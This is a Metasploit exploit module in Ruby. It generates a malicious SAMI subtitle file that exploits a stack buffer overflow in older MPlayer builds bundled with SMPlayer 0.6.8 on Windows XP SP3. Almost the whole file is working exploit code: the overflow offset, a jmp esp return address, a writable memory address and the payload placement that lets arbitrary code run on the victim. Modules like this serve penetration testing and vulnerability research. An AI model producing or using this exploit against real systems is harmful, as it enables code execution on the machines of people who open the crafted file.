# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MPlayer SAMI Subtitle File Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow found in the handling
        of SAMI subtitles files in MPlayer SVN Versions before 33471. It currently
        targets SMPlayer 0.6.8, which is distributed with a vulnerable version of mplayer.

        The overflow is triggered when an unsuspecting victim opens a movie file first,
        followed by loading the malicious SAMI subtitles file from the GUI. Or, it can also
        be done from the console with the mplayer "-sub" option.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
        &#039;Jacques Louw&#039;, # Vulnerability Discovery and PoC
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;Version&#039;        => &#039;$Revision: $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;BID&#039;, &#039;49149&#039; ],
          [ &#039;OSVDB&#039;, &#039;74604&#039; ],
          [ &#039;URL&#039;, &#039;http://labs.mwrinfosecurity.com/files/Advisories/mwri_mplayer-sami-subtitles_2011-08-12.pdf&#039; ],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 4000,
          &#039;BadChars&#039; => "\x00\x0a\x0d\x09\x3c\x3e\x5c\x22\x7b\x7d",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;SMPlayer 0.6.8 / mplayer.exe Sherpya-SVN-r29355-4.5.0 / Windows XP English SP3&#039;,
            {
              &#039;Offset&#039; => 1033,
              &#039;Ret&#039; => 0x016c14df, # jmp esp from mplayer.exe .rsrc
              &#039;WritableAddress&#039; => 0x013ab3ae # from mplayer.exe .bss
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 19 2011&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;, &#039;msf.smi&#039;]),
      ], self.class)
  end

  # Split the subtitle to avoid mplayer complaining
  # about the line max length
  def sami_encode(s)
    r = ""
    i = 0
    while i < s.length
      r << s[i, 32]
      r << "\n"
      i += 32
    end
    r
  end

  def exploit

    sploit = rand_text(target[&#039;Offset&#039;])
    sploit << [target.ret].pack("V")
    sploit << "\xeb\x06" # jmp short 0x8
    sploit << rand_text(2)
    sploit << [target[&#039;WritableAddress&#039;]].pack("V")
    sploit << payload.encoded

    sami = "<SAMI>\n"
    sami << "<BODY>\n"
    sami << "<SYNC Start=100550>\n"
    sami << sami_encode(sploit)
    sami << "</SYNC>\n"
    sami << "</BODY>\n"
    sami << "</SAMI>\n"

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")

    file_create(sami)
  end

end



